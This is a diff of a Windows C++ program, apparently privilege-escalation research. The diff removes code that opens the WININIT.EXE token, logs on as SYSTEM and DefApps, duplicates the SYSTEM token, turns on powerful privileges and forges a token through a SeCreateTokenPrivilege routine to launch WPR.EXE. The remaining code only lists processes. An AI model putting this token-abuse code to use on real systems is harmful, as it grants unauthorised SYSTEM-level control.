@@ -236,30 +236,6 @@ int printProcessInfo(HANDLE hProcess)
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {	
-	TCHAR username[1024] = {0};
-	DWORD username_len = 1023;
-	if (!win32Api.GetUserNameExW(NameSamCompatible, username, &username_len))
-	{
-		write2File(hFile, L"Error GetUserNameExW %d\n", GetLastError());
-	}
-	write2File(hFile, L"username=%ls\n",username);
-
-	DWORD currentProcessId = GetCurrentProcessId();
-	write2File(hFile, L"currentProcessId=0x%08X\n", currentProcessId);
-
-	HANDLE hCurrentProcess = GetCurrentProcess();
-	write2File(hFile, L"hCurrentProcess=0x%08X\n", hCurrentProcess);
-	printProcessInfo(hCurrentProcess);
-	
-	HANDLE hCurrentProcessToken = NULL;
-	if (!win32Api.OpenProcessToken(hCurrentProcess, TOKEN_ALL_ACCESS, &hCurrentProcessToken))
-	{
-		write2File(hFile, L"Error OpenProcessToken %d\n", GetLastError());
-		return 1;
-	}
-	write2File(hFile, L"************ hCurrentProcessToken=0x%08X information:\n", hCurrentProcessToken);
-	printAccessTokenInfo(hCurrentProcessToken);
-	
 	HANDLE hProcSnap;
 	hProcSnap = win32Api.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (INVALID_HANDLE_VALUE == hProcSnap) 
@@ -291,87 +267,11 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 		{
 			write2File(hFile, L"Next process handle=0x%08X\n",hSystemProcess);
 			printProcessInfo(hSystemProcess);
-			if (win32Api.lstrcmpiW(L"WININIT.EXE", pe32.szExeFile) == 0) 
-			{
-				write2File(hFile, L"WININIT.EXE found\n");
-				if (!win32Api.OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken))
-				{
-					write2File(hFile, L"Error OpenProcessToken %d\n", GetLastError());
-					return 1;
-				}
-				write2File(hFile, L"WININIT.EXE token=0x%08X\n", hSystemToken);
-			}
 		}
 	}
 	write2File(hFile, L"Error Process32NextW %d (18=ERROR_NO_MORE_FILES)\n", GetLastError());
 			
 	win32Api.CloseHandle(hProcSnap);
 	
-	
-	
-	HANDLE systemLogonToken = NULL;
-	if (!win32Api.LogonUserExExW(L"SYSTEM", L"NT AUTHORITY", NULL, LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, NULL, &systemLogonToken, NULL, NULL, NULL, NULL))
-	{
-		write2File(hFile, L"Error LogonUserExExW %d\n", GetLastError());
-		return 1;
-	}
-	
-	write2File(hFile, L"************ systemLogonToken=0x%08X information:\n", systemLogonToken);
-	printAccessTokenInfo(systemLogonToken);
-	
-	HANDLE defappsLogonToken = NULL;
-	SID logonSid = {};
-	PSID pLogonSid = &logonSid;
-	PVOID pProfileBuffer = NULL;
-	DWORD profileLength = 0;
-	QUOTA_LIMITS quotaLimits = {};
-	if (!win32Api.LogonUserExExW(L"DefApps", L"", L"", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, NULL, &defappsLogonToken, &pLogonSid, &pProfileBuffer, &profileLength, &quotaLimits))
-	{
-		write2File(hFile, L"Error LogonUserExExW %d\n", GetLastError());
-		return 1;
-	}
-	
-	write2File(hFile, L"************ defappsLogonToken=0x%08X information:\n", defappsLogonToken);
-	printAccessTokenInfo(defappsLogonToken);
-
-	if (isService)
-	{
-		HANDLE dupSystemToken = NULL;
-		if (!win32Api.DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken))
-		{
-			write2File(hFile, L"Error DuplicateTokenEx %d\n", GetLastError());
-			return 1;
-		}	
-		write2File(hFile, L"************ dupSystemToken=0x%08X information:\n", dupSystemToken);
-		printAccessTokenInfo(dupSystemToken);
-		
-		SetPrivilege(dupSystemToken, L"SeAssignPrimaryTokenPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeIncreaseQuotaPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeSecurityPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeTakeOwnershipPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeLoadDriverPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeBackupPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeRestorePrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeShutdownPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeSystemEnvironmentPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeUndockPrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeManageVolumePrivilege", TRUE);
-		SetPrivilege(dupSystemToken, L"SeManageVolumePrivilege", TRUE);
-		write2File(hFile, L"************ updated dupSystemToken=0x%08X information:\n", dupSystemToken);
-		printAccessTokenInfo(dupSystemToken);
-		
-		//https://github.com/hatRiot/token-priv/blob/master/poptoke/poptoke/SeCreateTokenPrivilege.cpp
-		write2File(hFile, L"se_create_token_privilege....\n");
-		HANDLE createdToken = se_create_token_privilege(hCurrentProcessToken, TRUE);
-		write2File(hFile, L"************ createdToken=0x%08X information:\n", createdToken);
-		printAccessTokenInfo(createdToken);
-		
-		WCHAR szCmdline1[]=L"C:\\windows\\system32\\WPR.EXE -start CPU.light -filemode";
-		printCreateProcess(createdToken, szCmdline1);
-		
-		WCHAR szCmdline2[]=L"C:\\windows\\system32\\WPR.EXE -stop C:\\Data\\USERS\\Public\\Documents\\wpr.etl";
-		printCreateProcess(createdToken, szCmdline2);
-	}
-
-    return 0;
+	return 0;
 }
